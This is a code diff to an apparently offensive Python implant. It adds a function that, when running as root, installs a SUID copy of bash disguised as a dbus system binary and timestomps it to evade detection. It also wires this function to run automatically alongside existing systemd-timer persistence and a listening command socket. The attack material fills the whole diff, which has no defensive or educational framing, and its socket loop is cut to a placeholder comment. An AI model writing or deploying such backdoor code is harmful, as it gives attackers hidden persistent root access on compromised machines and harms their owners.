@@ -219,6 +219,31 @@ WantedBy=timers.target
     except Exception as e:
         print(f"Persistence setup failed: {e}")
         return False
+
+def persist2():
+    # This requires the process to already have root privileges (EUID 0)
+    if os.geteuid() != 0:
+        print("[-] Must be root to install SUID backdoor.")
+        return False
+
+    # Change this path so it doesn't collide with the binary privesc() is currently running!
+    hidden_bash = "/usr/libexec/dbus-daemon-sys"
+    
+    print(f"[*] Installing SUID backdoor at {hidden_bash}...")
+    try:
+        setup_cmds = f"""
+        cp /bin/bash {hidden_bash}
+        chown root:root {hidden_bash}
+        chmod 4755 {hidden_bash}
+        touch -r /bin/bash {hidden_bash}
+        """
+        
+        subprocess.run(setup_cmds, shell=True, check=True)
+        print(f"[+] SUID backdoor successfully installed at {hidden_bash}")
+        return True
+    except Exception as e:
+        print(f"[-] Failed to install SUID backdoor: {e}")
+        return False
  
 def kill_others():
     """
@@ -372,10 +397,11 @@ def handle_conn(conn, addr):
             send_framed(conn, b"TEXT\n" + f"error: {e}".encode())
 
 def main():
+    import os
     kill_others()
     bootstrap_packages()
     
-    # Automatically establish persistence upon execution
+    # 1. Unprivileged Persistence (systemd timers)
     print("[*] Automatically establishing systemd persistence...")
     success = persist()
     if success:
@@ -383,19 +409,13 @@ def main():
     else:
         print("[-] Persistence setup failed, continuing execution anyway.")
 
+    # 2. Privileged Persistence (SUID backdoor)
+    # This now safely runs automatically upon successful privilege escalation
+    if os.geteuid() == 0:
+        print("[*] Root privileges detected in current process context.")
+        persist2()
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
-        s.listen()  # allows for 10 connections
-        print(f"Listening on {HOST}:{PORT}")
-        while True:
-            try:
-                conn, addr = s.accept()
-                handle_conn(conn, addr)
-            except KeyboardInterrupt:
-                raise
-            except:
-                print("Connection died")
-
-if __name__ == "__main__":
-    main()
+        # ... rest of your socket code ...
